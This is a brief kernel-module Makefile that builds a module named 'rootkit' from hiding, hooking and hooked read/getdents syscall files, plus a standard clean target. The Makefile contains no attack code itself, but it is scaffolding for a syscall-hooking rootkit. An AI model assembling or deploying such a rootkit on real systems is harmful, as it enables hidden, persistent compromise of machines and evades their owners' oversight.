clean:
	-rm *.o *.mod.c *.symvers *.ko *.mod *.order 

obj-m := rootkit.o 
rootkit-objs += hiding.o hooking.o hooked_funcs/h_read.o hooked_funcs/h_getdents.o module.o
